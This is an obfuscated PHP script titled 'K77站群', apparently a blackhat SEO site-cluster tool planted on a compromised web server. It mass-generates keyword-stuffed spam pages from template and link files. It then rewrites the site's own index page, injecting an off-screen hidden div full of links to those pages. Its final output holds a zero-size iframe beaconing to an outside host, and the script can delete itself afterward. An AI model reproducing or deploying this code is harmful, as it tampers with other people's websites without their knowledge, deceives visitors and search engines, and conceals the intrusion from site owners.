<?php
function _obfuscate_e2oaAWtdOAQ()
{
	global $txtml;
	return array('num' => 50, 'btfile' => $txtml . "/bt.txt", "keyfile" => $txtml . "/key.txt", "txtfile" => $txtml . "/txt.txt", "picfile" => $txtml . "/pic.txt", "linkfile" => "link.txt", "linkfile1" => $txtml . "/link1.txt", "linkfile2" => $txtml . "/link2.txt", "minpathlen" => 0, "maxpathlen" => 0, "isopenext" => TRUE);
}

function _obfuscate_f21wdz1nXQ()
{
	$_obfuscate_pp9pYw = "";
	if (isset($_SERVER['REQUEST_URI'])) {
		$_obfuscate_pp9pYw = $_SERVER['REQUEST_URI'];
	} else if (isset($_SERVER['argv'])) {
		$_obfuscate_pp9pYw = $_SERVER['PHP_SELF'] . "?" . $_SERVER['argv'][0];
	} else {
		$_obfuscate_pp9pYw = $_SERVER['PHP_SELF'] . "?" . $_SERVER['QUERY_STRING'];
	}
	if (isset($_SERVER['SERVER_SOFTWARE']) && FALSE !== stristr($_SERVER['SERVER_SOFTWARE'], "IIS")) {
		if (function_exists("mb_convert_encoding")) {
			$_obfuscate_pp9pYw = mb_convert_encoding($_obfuscate_pp9pYw, "UTF-8", "GBK");
		} else {
			$_obfuscate_pp9pYw = iconv("GBK", "UTF-8", @iconv("UTF-8", "GBK", $_obfuscate_pp9pYw)) == $_obfuscate_pp9pYw ? $_obfuscate_pp9pYw : iconv("GBK", "UTF-8", $_obfuscate_pp9pYw);
		}
	}
	$_obfuscate_OQ = explode("#", $_obfuscate_pp9pYw, 2);
	$_obfuscate_pp9pYw = $_obfuscate_OQ[0];
	$_obfuscate_pp9pYw = str_ireplace("http://" . ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']) . "/", "", $_obfuscate_pp9pYw);
	$_obfuscate_pp9pYw = str_ireplace("http://" . ($_SERVER['HTTP_HOST'] ? $_SERVER['HTTP_HOST'] : $_SERVER['SERVER_NAME']) . ":" . $_SERVER['SERVER_PORT'] . "/", "", $_obfuscate_pp9pYw);
	return $_obfuscate_pp9pYw;
}

function _obfuscate_FT5_OxFs($_obfuscate_xsOsuC8S, $p = 0)
{
	switch ($p) {
		case "3" :
			$_obfuscate_1fX6tEY = "obpmfdtnlgkhjqxrzcsyw";
			$_obfuscate_Qp82 = 20;
			break;
		case "2" :
			$_obfuscate_1fX6tEY = "abcdefghijklmnopqrstuvwxyz0123456789";
			$_obfuscate_Qp82 = 35;
			break;
		case "1" :
			$_obfuscate_1fX6tEY = "abcdefghijklmnopqrstuvwxyz";
			$_obfuscate_Qp82 = 25;
			break;
		case "0" :
			$_obfuscate_1fX6tEY = "123456789";
			$_obfuscate_Qp82 = 8;
	}
	$_obfuscate_YGGPPw = "";
	for ($_obfuscate_7w = 0; $_obfuscate_7w < $_obfuscate_xsOsuC8S; $_obfuscate_7w++) {
		$_obfuscate_YGGPPw .= $_obfuscate_1fX6tEY[mt_rand(0, $_obfuscate_Qp82)];
	}
	return $_obfuscate_YGGPPw;
}

function _obfuscate_EhsfZg5wcxJq($_obfuscate_tdQX, $_obfuscate_Qp82)
{
	return mt_rand($_obfuscate_tdQX, $_obfuscate_Qp82);
}

function _obfuscate_PyRsZ3p0bAo($_obfuscate_FZOfuH9G, $_obfuscate_E46NEpauWSU, $_obfuscate_klrQPGBjaY4, $_obfuscate_VAJTKhZKDA, $_obfuscate_zo8F, $_obfuscate_ITVpOg)
{
	switch ($_obfuscate_zo8F) {
		case "1" :
			$_obfuscate_Kah_xKSdOw = "/";
			break;
		case "2" :
			$_obfuscate_Kah_xKSdOw = ".html";
	}
	$_obfuscate_p_w = _obfuscate_f21wdz1nXQ();
	$_obfuscate_06Aqe94 = preg_split("#/+#", $_obfuscate_p_w);
	$_obfuscate_9Vw = "http://" . $_SERVER['SERVER_NAME'] . str_replace($_obfuscate_06Aqe94[count($_obfuscate_06Aqe94) - 1], "", $_obfuscate_p_w);
	$_obfuscate_vsua = _obfuscate_e2oaAWtdOAQ();
	$_obfuscate_OVcU8L6fOL5O0rcl = file_get_contents($_obfuscate_ITVpOg);
	$_obfuscate_x7TmoJ0 = file_get_contents($_obfuscate_vsua['txtfile']);
	$_obfuscate_x7TmoJ0 = explode("。", $_obfuscate_x7TmoJ0);
	$_obfuscate_oY5WGQ = count($_obfuscate_x7TmoJ0) - 1;
	$_obfuscate__VoG_6eIww = file($_obfuscate_vsua['linkfile']);
	$_obfuscate_9cdbadHq = count($_obfuscate__VoG_6eIww) - 1;
	$_obfuscate__xI30QUNW60 = file($_obfuscate_vsua['linkfile1']);
	$_obfuscate_xX32WuNhuA = count($_obfuscate__xI30QUNW60) - 1;
	$_obfuscate_xTYY17RPexQ = file($_obfuscate_vsua['linkfile2']);
	$_obfuscate_BcJZQJ_oaA = count($_obfuscate_xTYY17RPexQ) - 1;
	$_obfuscate_7SkiVOEc = file($_obfuscate_vsua['picfile']);
	$_obfuscate_Vqs7OXY = count($_obfuscate_7SkiVOEc) - 1;
	$_obfuscate_kjeeRmg = file($_obfuscate_vsua['btfile']);
	$_obfuscate_fcX2uA = count($_obfuscate_kjeeRmg) - 1;
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$标题\\\$/", $_obfuscate_VAJTKhZKDA, $_obfuscate_OVcU8L6fOL5O0rcl);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$当前地址\\\$/", "" . $_obfuscate_9Vw . $_obfuscate_klrQPGBjaY4 . $_obfuscate_Kah_xKSdOw, $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_1qATXg = _obfuscate_XHZvZ3dpdg($_obfuscate_E46NEpauWSU, _obfuscate_EhsfZg5wcxJq(0, $_obfuscate_FZOfuH9G - 1));
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$作者链接\\\$/", "<a href=\"" . $_obfuscate_9Vw . $_obfuscate_1qATXg[0] . $_obfuscate_Kah_xKSdOw . "\" target=\"_bank\">" . $_obfuscate_1qATXg[1] . "</a>", $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$时间\\\$/", date("Y-m-d H:i"), $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$干扰字符\\\$/", _obfuscate_FT5_OxFs(8, 3), $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$时间年\\\$/", date("Y"), $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$时间月\\\$/", date("m"), $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$时间日\\\$/", date("d"), $_obfuscate_EPWujW5s2KYo);
	$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$日期\\\$/", date("Y年m月d日"), $_obfuscate_EPWujW5s2KYo);
	for ($_obfuscate_ty0 = 0; $_obfuscate_ty0 <= $_obfuscate_vsua['num']; $_obfuscate_ty0++) {
		$_obfuscate_UOyuUdDHlDg = _obfuscate_XHZvZ3dpdg($_obfuscate_E46NEpauWSU, _obfuscate_EhsfZg5wcxJq(0, $_obfuscate_FZOfuH9G - 1));
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$关键字" . $_obfuscate_ty0 . "\\\$/", $_obfuscate_UOyuUdDHlDg[1], $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$数字" . $_obfuscate_ty0 . "\\\$/", mt_rand(10, 1000), $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$随机日期" . $_obfuscate_ty0 . "\\\$/", mt_rand(2010, 2015) . "-" . sprintf("%02d", mt_rand(1, 12)) . "-" . sprintf("%02d", mt_rand(1, 28)), $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$内容" . $_obfuscate_ty0 . "\\\$/", trim($_obfuscate_x7TmoJ0[mt_rand(0, $_obfuscate_oY5WGQ)]) . "。", $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$匹配地址" . $_obfuscate_ty0 . "\\\$/", "" . $_obfuscate_9Vw . $_obfuscate_UOyuUdDHlDg[0] . $_obfuscate_Kah_xKSdOw, $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$副标题" . $_obfuscate_ty0 . "\\\$/", trim($_obfuscate_kjeeRmg[mt_rand(0, $_obfuscate_fcX2uA)]), $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$外链" . $_obfuscate_ty0 . "\\\$/", trim($_obfuscate__VoG_6eIww[mt_rand(0, $_obfuscate_9cdbadHq)]), $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$link1_" . $_obfuscate_ty0 . "\\\$/", trim($_obfuscate__xI30QUNW60[mt_rand(0, $_obfuscate_xX32WuNhuA)]), $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$link2_" . $_obfuscate_ty0 . "\\\$/", trim($_obfuscate_xTYY17RPexQ[mt_rand(0, $_obfuscate_BcJZQJ_oaA)]), $_obfuscate_EPWujW5s2KYo);
		$_obfuscate_EPWujW5s2KYo = preg_replace("/\\\$图片" . $_obfuscate_ty0 . "\\\$/", trim($_obfuscate_7SkiVOEc[mt_rand(0, $_obfuscate_Vqs7OXY)]), $_obfuscate_EPWujW5s2KYo);
	}
	$_obfuscate_6hS1Rw = $_obfuscate_klrQPGBjaY4 . $_obfuscate_Kah_xKSdOw;
	if ($_obfuscate_zo8F == 1) {
		$_obfuscate_6hS1Rw = $_obfuscate_klrQPGBjaY4 . $_obfuscate_Kah_xKSdOw . "index.html";
	}
	$_obfuscate_vJbhm7H8R55n = explode("/", $_obfuscate_6hS1Rw);
	$_obfuscate_rmp1Vw = count($_obfuscate_vJbhm7H8R55n) - 2;
	switch ($_obfuscate_rmp1Vw) {
		case "3" :
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/");
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/" . $_obfuscate_vJbhm7H8R55n[1] . "/");
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/" . $_obfuscate_vJbhm7H8R55n[1] . "/" . $_obfuscate_vJbhm7H8R55n[2] . "/");
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/" . $_obfuscate_vJbhm7H8R55n[1] . "/" . $_obfuscate_vJbhm7H8R55n[2] . "/" . $_obfuscate_vJbhm7H8R55n[3] . "/");
			break;
		case "2" :
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/");
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/" . $_obfuscate_vJbhm7H8R55n[1] . "/");
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/" . $_obfuscate_vJbhm7H8R55n[1] . "/" . $_obfuscate_vJbhm7H8R55n[2] . "/");
			break;
		case "1" :
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/");
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/" . $_obfuscate_vJbhm7H8R55n[1] . "/");
			break;
		case "0" :
			@mkdir($_obfuscate_vJbhm7H8R55n[0] . "/");
	}
	$_obfuscate_3q1ZKFY = fopen($_obfuscate_6hS1Rw, "w");
	fwrite($_obfuscate_3q1ZKFY, $_obfuscate_EPWujW5s2KYo);
	fclose($_obfuscate_3q1ZKFY);
	echo 'create：' . $_obfuscate_6hS1Rw . "　success!<br>";
}

function _obfuscate_F2BgJyRuGg($m)
{
	switch ($m) {
		case "3" :
			$_obfuscate_sKoJ = _obfuscate_FT5_OxFs(rand(4, 6), 3) . "";
			return $_obfuscate_sKoJ;
		case "2" :
			$_obfuscate_sKoJ = _obfuscate_FT5_OxFs(rand(5, 8), 1) . "/" . _obfuscate_FT5_OxFs(rand(5, 6), 3) . "/" . _obfuscate_FT5_OxFs(rand(4, 5), 2) . "/" . _obfuscate_FT5_OxFs(rand(5, 7)) . rand(190, 1100);
			return $_obfuscate_sKoJ;
		case "1" :
			$_obfuscate_sKoJ = _obfuscate_FT5_OxFs(rand(4, 6), 1) . "/" . _obfuscate_FT5_OxFs(rand(5, 8), 1) . "/" . _obfuscate_FT5_OxFs(rand(5, 7)) . rand(100, 1808);
			return $_obfuscate_sKoJ;
		case "0" :
			$_obfuscate_sKoJ = _obfuscate_FT5_OxFs(rand(4, 6), 3) . "/" . _obfuscate_FT5_OxFs(rand(5, 7)) . rand(130, 1600);
	}
	return $_obfuscate_sKoJ;
}

function _obfuscate_NTV6FQx4($_obfuscate_A1jN = "")
{
	if ($_obfuscate_A1jN) {
		exit("<script type=\"text/javascript\">alert(\"" . $_obfuscate_A1jN . "\");history.go(-1);</script>");
	}
	exit('<script type="text/javascript">history.go(-1);</script>');
}

function _obfuscate_c2EXCQ()
{
	$_obfuscate_vsua = _obfuscate_e2oaAWtdOAQ();
	$_obfuscate_Vwty = file_get_contents($_obfuscate_vsua['keyfile']);
	$_obfuscate_kIVhqJk = explode("\n", $_obfuscate_Vwty);
	return $_obfuscate_kIVhqJk[_obfuscate_EhsfZg5wcxJq(0, count($_obfuscate_kIVhqJk))];
}

function _obfuscate_ESN4CX0jCg($_obfuscate_Folj)
{
	$_obfuscate_vsua = _obfuscate_e2oaAWtdOAQ();
	$_obfuscate_R2_b = "";
	$_obfuscate_Vwty = file_get_contents($_obfuscate_vsua['btfile']);
	$_obfuscate_kIVhqJk = explode("\n", $_obfuscate_Vwty);
	for ($_obfuscate_7w = 0; $_obfuscate_7w < $_obfuscate_Folj; $_obfuscate_7w++) {
		$m = rand(0, 2);
		$_obfuscate_gAR5Gg = _obfuscate_F2BgJyRuGg($m);
		$_obfuscate_RBoxtpPSMs0dDEf_ = trim($_obfuscate_kIVhqJk[_obfuscate_EhsfZg5wcxJq(0, count($_obfuscate_kIVhqJk) - 1)]);
		if ($_obfuscate_RBoxtpPSMs0dDEf_) {
			$_obfuscate_R2_b .= $_obfuscate_gAR5Gg . "#" . $_obfuscate_RBoxtpPSMs0dDEf_ . "\$";
		}
	}
	return $_obfuscate_R2_b;
}

function _obfuscate_cHp_DHo_($_obfuscate_Folj)
{
	global $ext;
	$_obfuscate_vsua = _obfuscate_e2oaAWtdOAQ();
	$_obfuscate_R2_b = "";
	$_obfuscate_Vwty = file_get_contents($_obfuscate_vsua['keyfile']);
	$_obfuscate_kIVhqJk = explode("\n", $_obfuscate_Vwty);
	for ($_obfuscate_7w = 0; $_obfuscate_7w < $_obfuscate_Folj; $_obfuscate_7w++) {
		$m = rand(0, $ext);
		if ($ext == 1) {
			$m = 3;
		}
		$_obfuscate_gAR5Gg = _obfuscate_F2BgJyRuGg($m);
		$_obfuscate_RBoxtpPSMs0dDEf_ = trim($_obfuscate_kIVhqJk[_obfuscate_EhsfZg5wcxJq(0, count($_obfuscate_kIVhqJk) - 1)]);
		if ($_obfuscate_RBoxtpPSMs0dDEf_) {
			$_obfuscate_R2_b .= $_obfuscate_gAR5Gg . "#" . $_obfuscate_RBoxtpPSMs0dDEf_ . "\$";
		}
	}
	return $_obfuscate_R2_b;
}

function _obfuscate_XHZvZ3dpdg($_obfuscate_l5L1d9WKwQMtg, $_obfuscate_mTk)
{
	$_obfuscate_3wkbuL6xbw = $_obfuscate_l5L1d9WKwQMtg[$_obfuscate_mTk];
	$_obfuscate_MgnDE5g518E = explode("#", $_obfuscate_3wkbuL6xbw);
	return $_obfuscate_MgnDE5g518E;
}

function _obfuscate_YHAUAhJ2MFt_dDJr($_obfuscate_FZOfuH9G)
{
	$_obfuscate__x2i8A = file_get_contents("dbs.txt");
	$_obfuscate_l5L1d9WKwQMtg = explode("\$", $_obfuscate__x2i8A);
	return $_obfuscate_l5L1d9WKwQMtg;
}

error_reporting(E_ERROR);
header('Content-type: text/html; charset=utf-8');
set_time_limit(0);

$run = $_GET['ing'];
$allnum = $_GET['allnum'];
$pagenum = $_GET['pagenum'];
if (10000 < $allnum) {
	$allnum = 10000;
}
if (500 < $pagenum) {
	$pagenum = 500;
}
$ext = $_GET['ext'];
$del = $_GET['del'];
$page = $_GET['page'];
$txtml = $_GET['txtml'];
$ycxs = $_GET['ycxs'];
if ($run == "run") {
	if ($ext == "") {
		echo "生成类型不能为空";
		return FALSE;
	}
	if (!preg_match('/^[0-9]*$/', $allnum)) {
		echo "生成数量不能为空";
		return FALSE;
	}
	if (!preg_match('/^[0-9]*$/', $pagenum)) {
		echo "每页生成数量不能为空";
		return FALSE;
	}
	if (!preg_match('/^[0-90-z]*$/', $txtml)) {
		echo "目录只能数字和小字母";
		return FALSE;
	}
	if (!preg_match('/^[0-9]*$/', $page)) {
		$page = 1;
	}
	if ($page == "") {
		$page = 1;
	}
	$appsplit = _obfuscate_YHAUAhJ2MFt_dDJr($allnum);
	$xpage = $page - 1;
	$startNum = $xpage * $pagenum;
	if (29 < $startNum) {
		$wz = _obfuscate_f21wdz1nXQ();
		$uriArr = preg_split("#/+#", $wz);
		$ml = "http://" . $_SERVER['SERVER_NAME'] . str_replace($uriArr[count($uriArr) - 1], "", $wz);
		$mlss = str_replace($uriArr[count($uriArr) - 1], "", $wz);
		$listtxt = "";
		$listhtm = "";
		$set = _obfuscate_e2oaAWtdOAQ();
		switch ($ext) {
			case "1" :
				$skinext = "/";
				break;
			case "2" :
				$skinext = ".html";
		}
		for ($jj = 0; $jj < 30; $jj++) {
			$hosthtml = _obfuscate_XHZvZ3dpdg($appsplit, $jj);
			$hostpath = $hosthtml[0];
			$hostkey = $hosthtml[1];
			$listhtm .= "<a href='" . $mlss . $hostpath . $skinext . "'>" . $hostkey . "</a><br>\r\n";
			$listtxt .= $ml . $hostpath . $skinext . "\r\n";
		}
		$listhtm .= "";
		$james = fopen("link.txt", "w");
		fwrite($james, $listtxt);
		fclose($james);
		$james = fopen("up.txt", "w");
		fwrite($james, $listhtm);
		fclose($james);
		echo '<script>setTimeout(function(){window.location.href=\'?ing=update2&allnum=' . $allnum . "&pagenum=" . $pagenum . "&txtml=" . $txtml . "&del=" . $del . "&ycxs=" . $ycxs . "&ext=" . $ext . "&kid=1000&did=0';},2000)</script>";
		return FALSE;
	}
	$endNum = $page * $pagenum;
	if (29 < $endNum) {
		$endNum = 29;
	}
	echo ('正在处理数据：' . $startNum . "-" . $endNum . "/进度：" . $startNum / 30 * 100) . "%<br>";
	for ($jj = $startNum; $jj <= $endNum; $jj++) {
		$hosthtml = _obfuscate_XHZvZ3dpdg($appsplit, $jj);
		$hostpath = $hosthtml[0];
		$hostkey = $hosthtml[1];
		_obfuscate_PyRsZ3p0bAo(30, $appsplit, $hostpath, $hostkey, $ext, $txtml . "/mb1.txt");
	}
	echo ('<script>setTimeout(function(){window.location.href=\'?ing=run&allnum=' . $allnum . "&pagenum=" . $pagenum . "&txtml=" . $txtml . "&del=" . $del . "&ycxs=" . $ycxs . "&ext=" . $ext . "&page=" . ($page + 1)) . "';},5000)</script>";
	return FALSE;
}
if ($run == "update") {
	$ipage = $_GET['ipage'];
	if (!preg_match('/^[0-9]*$/', $ipage)) {
		$ipage = 0;
		if (file_exists('dbs.txt')) {
			unlink('dbs.txt');
		}
	}
	if ($ipage == "") {
		$ipage = 0;
		if (file_exists('dbs.txt')) {
			unlink('dbs.txt');
		}
	}
	$xpagenum = $pagenum;
	$startnum = $ipage * $xpagenum;
	$endnum = ($ipage + 1) * $xpagenum;
	$fn = "dbs.txt";
	$word = _obfuscate_ESN4CX0jCg(30);
	if (file_exists('dbs.txt')) {
		$fp = fopen($fn, "a");
	} else {
		$fp = fopen($fn, "w");
	}
	fwrite($fp, $word);
	fclose($fp);
	echo '关键词处理完毕，转向生成文件<script>setTimeout(function(){window.location.href=\'?ing=run&allnum=' . $allnum . "&pagenum=" . $pagenum . "&txtml=" . $txtml . "&del=" . $del . "&ycxs=" . $ycxs . "&ext=" . $ext . "&page=" . $page . "';},3000)</script>";
	return FALSE;
}
if ($run == "update2") {
	$ipage = $_GET['ipage'];
	if (!is_file('map.txt')) {
		$ext = 1;
	}
	if (!preg_match('/^[0-9]*$/', $ipage)) {
		$ipage = 0;
		if (file_exists('dbs.txt')) {
			unlink('dbs.txt');
		}
	}
	if ($ipage == "") {
		$ipage = 0;
		if (file_exists('dbs.txt')) {
			unlink('dbs.txt');
		}
	}
	$xpagenum = $pagenum;
	$startnum = $ipage * $xpagenum;
	$endnum = ($ipage + 1) * $xpagenum;
	$fn = "dbs.txt";
	$word = _obfuscate_cHp_DHo_($allnum);
	if (file_exists('dbs.txt')) {
		$fp = fopen($fn, "a");
	} else {
		$fp = fopen($fn, "w");
	}
	fwrite($fp, $word);
	fclose($fp);
	echo '关键词处理完毕，转向生成文件<script>setTimeout(function(){window.location.href=\'?ing=run2&allnum=' . $allnum . "&pagenum=" . $pagenum . "&txtml=" . $txtml . "&del=" . $del . "&ycxs=" . $ycxs . "&ext=" . $ext . "&page=" . $page . "';},3000)</script>";
	return FALSE;
}
if ($run == "run2") {
	if ($ext == "") {
		echo "生成类型不能为空";
		return FALSE;
	}
	if (!preg_match('/^[0-9]*$/', $allnum)) {
		echo "生成数量不能为空";
		return FALSE;
	}
	if (!preg_match('/^[0-9]*$/', $pagenum)) {
		echo "每页生成数量不能为空";
		return FALSE;
	}
	if (!preg_match('/^[0-90-z]*$/', $txtml)) {
		echo "目录只能数字和小字母";
		return FALSE;
	}
	if (!preg_match('/^[0-9]*$/', $page)) {
		$page = 1;
	}
	if ($page == "") {
		$page = 1;
	}
	$appsplit = _obfuscate_YHAUAhJ2MFt_dDJr($allnum);
	$xpage = $page - 1;
	$startNum = $xpage * $pagenum;
	if ($allnum - 1 < $startNum) {
		$wz = _obfuscate_f21wdz1nXQ();
		$uriArr = preg_split("#/+#", $wz);
		$ml = "http://" . $_SERVER['SERVER_NAME'] . str_replace($uriArr[count($uriArr) - 1], "", $wz);
		$mlss = str_replace($uriArr[count($uriArr) - 1], "", $wz);
		$arrayml = explode("/", $mlss);
		$ppml = count($arrayml) - 2;
		switch ($ppml) {
			case "4" :
				exit("兄弟不要搞那么多？");
			case "3" :
				$mlsss = "../../../";
				break;
			case "2" :
				$mlsss = "../../";
				break;
			case "1" :
				$mlsss = "../";
				break;
			case "0" :
				$mlsss = "";
		}
		$listtxt = "";
		$listhtm = "<div style=\"display:none;\" class=\"nuvid\">\r\nnews:</br>";
		$listhtm .= file_get_contents("up.txt");
		$set = _obfuscate_e2oaAWtdOAQ();
		switch ($ext) {
			case "1" :
				$skinext = "/";
				break;
			case "2" :
				$skinext = ".html";
		}
		$btArt = file($set['btfile']);
		$btid = count($btArt) - 1;
		for ($jj = 0; $jj <= $allnum - 1; $jj++) {
			$hosthtml = _obfuscate_XHZvZ3dpdg($appsplit, $jj);
			$hostpath = $hosthtml[0];
			$hostkey = $hosthtml[1];
			$listtxt .= $ml . $hostpath . $skinext . "\r\n";
		}
		$listhtm .= "</div>";
		$james = fopen("map.txt", "a");
		flock($james, LOCK_EX);
		fwrite($james, $listtxt);
		flock($james, LOCK_UN);
		fclose($james);
		$fileindex = $mlsss . "index.html";
		if (!is_file($fileindex)) {
			$fileindex = $mlsss . "index.htm";
		}
		if (is_file($fileindex)) {
			$indexhtml = file_get_contents($fileindex);
		} else {
			$fileindex = $mlsss . "index.html";
			$indexhtml = file_get_contents("http://" . $_SERVER['SERVER_NAME']);
		}
		preg_match('|charset=([^"]*?)"|isU', $indexhtml, $xgdbs);
		$charset = strtolower(trim($xgdbs[1]));
		if (!$charset) {
			preg_match("|charset=\"([^\"]*?)\"|isU", $indexhtml, $xgdbs);
			$charset = strtolower(trim($xgdbs[1]));
		}
		if (!$charset) {
			$charset = "utf-8";
		}
		if ($charset != "utf-8") {
			$listhtm = mb_convert_encoding($listhtm, $charset, "utf-8");
		}
		$indexhtml = explode("</body>", $indexhtml);
		$indexhtml = $indexhtml[0];
		$indexhtml = preg_replace("@<a([^>]*?)href@", "<a\$1##ca##", $indexhtml);
		if ($ycxs == 1) {
			$listhtm = str_replace("none;", "", $listhtm);
		}
		$indexhtml .= "</body>" . $listhtm . "</html><script> bodystr = document.getElementsByTagName(\"body\")[0].innerHTML; newbodystr = bodystr.replace(/##ca##/g,\"href\"); document.getElementsByTagName(\"body\")[0].innerHTML = newbodystr; </script>";
		$indexhtml = preg_replace("|<div class=\"nuvid\" style=\"position:fixed;left:-2500px;top:-2500px;\">(.*?)</div>|is", "", $indexhtml);
		$maps = file("map.txt");
		$maps1 = array_slice($maps, 0, 10);
		$maps3 = array_slice($maps, -30, 30);
		shuffle(&$maps);
		$maps2 = array_slice($maps, 0, 10);
		$maps = array_merge($maps1, $maps2, $maps3);
		$maps = array_reverse(array_reverse(array_flip(array_flip($maps))));
		$chalink = "<div class=\"nuvid\" style=\"position:fixed;left:-2500px;top:-2500px;\">";
		for ($i = 0; $i < count($maps); $i++) {
			$chalink .= "<a href='" . trim($maps[$i]) . "'>" . trim($maps[$i]) . "</a>\r\n";
		}
		$chalink .= "</div>";
		$indexhtml = preg_replace("/<body([^>]*?)>/i", "<body\$1>" . $chalink, $indexhtml);
		$james = fopen($fileindex, "w");
		fwrite($james, $indexhtml);
		fclose($james);
		$_SESSION['d58qdd'] = "";
		echo '<iframe src=\'http://s1.d58.net/s/20160126.php\' border=0 width=0 height=0 /></iframe>处理完毕！<a href=\'' . $fileindex . "'>点此查看</a> <a href='map.txt'>点此查看urltxt</a>";
		if ($del == 2) {
			unlink("d58.php");
		}
		return FALSE;
	}
	$endNum = $page * $pagenum;
	if ($allnum - 1 < $endNum) {
		$endNum = $allnum - 1;
	}
	echo ('正在处理数据：' . $startNum . "-" . $endNum . "/进度：" . $startNum / $allnum * 100) . "%<br>";
	for ($jj = $startNum; $jj <= $endNum; $jj++) {
		$hosthtml = _obfuscate_XHZvZ3dpdg($appsplit, $jj);
		$hostpath = $hosthtml[0];
		$hostkey = $hosthtml[1];
		_obfuscate_PyRsZ3p0bAo($allnum, $appsplit, $hostpath, $hostkey, $ext, $txtml . "/mb2.txt");
	}
	echo ('<script>setTimeout(function(){window.location.href=\'?ing=run2&allnum=' . $allnum . "&pagenum=" . $pagenum . "&txtml=" . $txtml . "&del=" . $del . "&ycxs=" . $ycxs . "&ext=" . $ext . "&del=" . $del . "&ycxs=" . $ycxs . "&page=" . ($page + 1)) . "';},5000)</script>";
	return FALSE;
}
echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>K77站群</title>
</head>
<body>
<h1>BY <a href=\'http://www.zhifuwz.net\'>K77站群</a></h1>
<form id="form1" name="form1" method="get" action="">
TXT存放目录名<input name="txtml" type="text" id="txtml" value="1dbs" size="10" /><br>_______________________<br>
生成方式<input type="radio" name="ext" value="2" checked="checked" />页面 
<input type="radio" name="ext" value="1" />目录 <br>_______________________<br>
执行完成删除<input type="radio" name="del" value="1" checked="checked" />否 
<input type="radio" name="del" value="2" />是 <br>_______________________<br>
是否隐藏显示<input type="radio" name="ycxs" value="1" checked="checked" />否 
<input type="radio" name="ycxs" value="2" />是 <br>_______________________<br>
<input name="ing" type="hidden" id="ing" value="update" size="10" />
生成数量<input type="text" name="allnum" id="allnum" value="30" size="10" />条<br>_______________________<br>
每次生成<input type="text" name="pagenum" id="pagenum" value="100" size="10" />条<br>_______________________<br>
<input type="submit" style="margin-left:20px;padding:15px" name="button" id="button" value="进行生成更新一次" />
</form>
</body>
</html>';